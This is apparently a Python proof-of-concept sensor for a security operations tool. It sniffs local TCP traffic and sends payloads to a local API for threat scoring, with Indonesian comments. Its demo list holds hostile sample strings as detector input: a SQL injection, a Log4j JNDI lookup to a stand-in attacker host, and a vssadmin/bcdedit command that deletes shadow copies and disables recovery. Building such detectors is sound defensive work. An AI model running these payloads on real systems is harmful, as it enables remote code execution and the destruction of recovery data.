import time
import requests
import json
import threading
from scapy.all import sniff, IP, TCP, Raw

# Konfigurasi Target AEGIS SOC API
AEGIS_API_URL = "http://localhost:3000/api/analyze-packet"

print("=" * 70)
print(" 🛡️ AEGIS SOC - Advanced Network Sensor & DPI Probe (PoC Edition)")
print(f" Target API Endpoint: {AEGIS_API_URL}")
print("=" * 70)

def send_to_aegis(payload_str, source_type="LIVE_PACKET"):
    """Mengirim payload paket jaringan ke API AEGIS SOC untuk dianalisis AI/Heuristic"""
    headers = {"Content-Type": "application/json"}
    data = {"payload": payload_str}

    try:
        print(f"\n[SENSOR [{source_type}]] Menganalisis payload: \"{payload_str[:60]}...\"")
        start_time = time.time()
        response = requests.post(AEGIS_API_URL, headers=headers, json=data, timeout=5)
        elapsed = (time.time() - start_time) * 1000

        if response.status_code == 200:
            res_json = response.json()
            verdict = res_json.get("verdict", "UNKNOWN")
            score = res_json.get("heuristicScore", 0)
            zero_day = res_json.get("zeroDayProb", 0)
            engine = res_json.get("engine", "N/A")
            routing = res_json.get("trafficRouting", "N/A")
            action = res_json.get("suggestedAction", "N/A")
            reasons = res_json.get("reasons", [])

            # Cetak hasil analisis dengan format SOC Dashboard yang rapi
            print(f"  ├─ Engine Used  : {engine} ({elapsed:.1f}ms)")
            print(f"  ├─ Verdict      : {'🚨 ' + verdict if verdict == 'QUARANTINE_ISOLATE' else '✅ ' + verdict}")
            print(f"  ├─ Heuristic    : Score {score}/100 | Zero-Day Prob: {zero_day}%")
            print(f"  ├─ Routing      : {routing}")
            print(f"  └─ Action       : {action}")
            if reasons:
                print(f"     Reasons      : {reasons[0]}")
        else:
            print(f"  ❌ Gagal merespons. HTTP Status: {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("  ❌ Koneksi Gagal: Pastikan server AEGIS SOC Anda sedang menyala (npm run dev atau Render).")
    except Exception as e:
        print(f"  ❌ Error: {e}")

# --- 1. LIVE PACKET SNIFFER (Scapy) ---
def packet_callback(packet):
    """Callback untuk memproses paket jaringan mentah yang ditangkap Scapy"""
    if packet.haslayer(Raw) and packet.haslayer(IP):
        try:
            raw_payload = packet[Raw].load.decode('utf-8', errors='ignore')
            # Filter hanya payload yang bermakna atau mencakup teks HTTP/API request
            if len(raw_payload) > 10 and any(k in raw_payload.upper() for k in ["GET", "POST", "HTTP", "SELECT", "JNDI", "UNION"]):
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst
                formatted_payload = f"IP:{src_ip}->{dst_ip} | {raw_payload.strip()}"
                send_to_aegis(formatted_payload, source_type="SCAPY_SNIFFER")
        except Exception:
            pass

def start_scapy_sniffer():
    print("[INFO] Memulai Scapy Live Packet Sniffer pada interface jaringan lokal...")
    try:
        # Menangkap paket TCP (biasanya HTTP/Web traffic)
        sniff(filter="tcp port 3000 or tcp port 80 or tcp port 443", prn=packet_callback, store=0)
    except Exception as e:
        print(f"[WARN] Scapy sniffer memerlukan hak akses Administrator/Root. Error: {e}")

# --- 2. DEMO ATTACK INJECTOR (Untuk Keperluan Video PoC) ---
def start_demo_simulation():
    """Menginjeksikan sampel serangan secara berkala agar video demo memiliki hasil yang dramatis"""
    simulated_attacks = [
        ("Trafik Normal (Clean HTTP GET)", "GET /dashboard/index.html HTTP/1.1 - User-Agent: Mozilla/5.0"),
        ("SQL Injection Attack", "SELECT * FROM users WHERE username = 'admin' OR '1'='1' --"),
        ("Remote Code Execution (Log4j / JNDI)", "${jndi:ldap://evil-actor.internal-net/exploit}"),
        ("Ransomware System Call (VSSAdmin)", "vssadmin delete shadows /all /quiet && bcdedit /set {default} recoveryenabled no"),
        ("DNS Tunneling Exfiltration", "C2VzcyBhZG1pbiBkZWxldGUgc2hhZG93cyBhbGwgY29uZmlnLnNlY3VyZS5sb2NhbCBleGZpbHRyYXRpb24="),
    ]
    
    time.sleep(3) # Jeda pemanasan
    print("\n[INFO] Mengaktifkan Simulator Serangan PoC untuk Keperluan Video Demo...\n")
    
    while True:
        for title, payload in simulated_attacks:
            print(f"\n================ [ DEMO SKENARIO: {title} ] ================")
            send_to_aegis(payload, source_type="POC_SIMULATOR")
            print("=" * 65)
            time.sleep(10) # Jeda 10 detik antar skenario serangan

if __name__ == "__main__":
    # Jalankan Scapy Sniffer di Background Thread
    sniffer_thread = threading.Thread(target=start_scapy_sniffer, daemon=True)
    sniffer_thread.start()

    # Jalankan Demo Simulator di Main Thread agar hasil videonya interaktif
    try:
        start_demo_simulation()
    except KeyboardInterrupt:
        print("\n[INFO] Sensor dihentikan. Keluar...")